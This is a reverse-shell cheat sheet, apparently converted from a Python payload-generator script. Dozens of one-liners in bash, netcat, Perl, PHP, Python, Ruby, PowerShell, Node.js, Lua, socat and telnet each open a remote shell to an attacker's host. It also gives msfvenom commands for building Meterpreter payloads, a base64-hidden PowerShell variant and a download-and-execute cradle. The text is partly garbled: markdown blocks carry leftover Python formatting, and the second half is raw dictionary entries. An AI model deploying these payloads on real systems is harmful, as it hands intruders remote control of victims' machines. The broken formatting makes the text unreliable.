# Spawning a shell

```bash
# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%d -f asp > revshell.asp' % (ipaddr, port),
```

```bash
# AWK
awk \'BEGIN {s = "/inet/tcp/0/%s/%d"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null' % (ipaddr, port),
```

```bash
# Bash - Option 1
bash -i >& /dev/tcp/%s/%d 0>&1' % (ipaddr, port),
```

```bash
# Bash - Option 2
0<&196;exec 196<>/dev/tcp/%s/%d; bash <&196 >&196 2>&196' % (ipaddr, port),
```

```bash
# Bash - Option 3
exec 5<> /dev/tcp/%s/%d; cat <&5 | while read line; do $line 2>&5>&5; done' % (ipaddr, port),
```

```bash
# Java
r = Runtime.getRuntime();p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor();' % (ipaddr, port),
```

```bash
# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%d -f raw > revshell.jsp' % (ipaddr, port),
```

```bash
# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%d -f elf > revshell' % (ipaddr, port),
```

```bash
# Lua
lua5.1 -e \'local host,port = \"%s\",%d local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host,port); while true do local cmd,status,partial = tcp:receive() local f = io.popen(cmd,'r') local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()\'' % (ipaddr, port),
```

```bash
# Netcat 
nc -e /bin/sh %s %d' % (ipaddr, port),
```

```bash
# Netcat -c
nc -c /bin/sh %s %d' % (ipaddr, port),
```

```bash
# Netcat mkfifo
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f' % (ipaddr, port),
```       

```bash
# Netcat mknod
rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc %s %d 1>/tmp/l' % (ipaddr, port),
```

```bash
# Netcat pipe
/bin/sh | nc %s %d' % (ipaddr, port),
```       
       
```bash
# Ncat
ncat %s %d -e /bin/sh' % (ipaddr, port),
```

        'nodejs':'(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(%d,"%s",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();' % (port, ipaddr),
        'osx-bin':'msfvenom -p osx/x86/shell_reverse_tcp LHOST=%s LPORT=%d -f macho > revshell.macho' % (ipaddr, port),
        'perl':'perl -e \'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' % (ipaddr, port),
        'perl-2':'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"%s:%d");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'' % (ipaddr, port),
        'perl-windows':'perl -MIO -e \'$c=new IO::Socket::INET(PeerAddr,"%s:%d");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'' % (ipaddr, port),
        'php':'php -r \'$sock=fsockopen("%s",%d);exec("/bin/sh -i <&3 >&3 2>&3");\'' % (ipaddr, port),
        'php-2':'php -r \'$s=fsockopen("%s",%d);shell_exec("/bin/sh -i <&3 >&3 2>&3");\'' % (ipaddr, port),
        'php-3':'php -r \'$s=fsockopen("%s",%d);`/bin/sh -i <&3 >&3 2>&3`;\'' % (ipaddr, port),
        'php-4':'php -r \'$s=fsockopen("%s",%d);system("/bin/sh -i <&3 >&3 2>&3");\'' % (ipaddr, port),
        'php-5':'php -r \'$s=fsockopen("%s",%d);popen("/bin/sh -i <&3 >&3 2>&3", "r");\'' % (ipaddr, port),
        'ps-tcp':'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"%s\",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' % (ipaddr, port),
        'ps-iex':'powershell IEX (New-Object Net.WebClient).DownloadString("http://%s:%d/revshell.ps1") \n\nMake a revshell.ps1 file and put it on your server!' % (ipaddr, port),
        'ps-b64':'powershell -e '+ b64encode(('$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' % (ipaddr, port)).encode('utf16')[2:]).decode(),
        'python':'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'' % (ipaddr, port),
        'python-2':'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")\'' % (ipaddr, port),
        'ruby':'ruby -rsocket -e\'f=TCPSocket.open(\"%s\",%d).to_i;exec sprintf(\"/bin/sh -i <&3 >&3 2>&3\",f,f,f)\'' % (ipaddr, port),
        'ruby-2':'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("%s","%d");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'' % (ipaddr, port),
        'ruby-windows':'ruby -rsocket -e \'c=TCPSocket.new("%s","%d");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'' % (ipaddr, port),
        'socat':'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:%s:%d \n\n[+] Catch incoming shell with:\n\nsocat file:`tty`,raw,echo=0 tcp-listen:%d' % (ipaddr, port, port),
        'tclsh':'echo \'set s [socket %s %d];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;\' | tclsh' % (ipaddr, port),
        'telnet':'rm -f /tmp/p; mknod /tmp/p p && telnet %s %d 0/tmp/p' % (ipaddr, port),
        'telnet-mkfifo':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet %s %d > /tmp/f' % (ipaddr, port),
        'war':'msfvenom -p java/shell_reverse_tcp LHOST=%s LPORT=%d -f war -o revshell.war' % (ipaddr, port),
        'win-bin':'msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%d -f exe > revshell.exe' % (ipaddr, port),
        'xterm':'xterm -display %s:1 \n\n[+] Connect to your shell with:\n\nXnest :1 or xhost +targetip' % (ipaddr)
    }
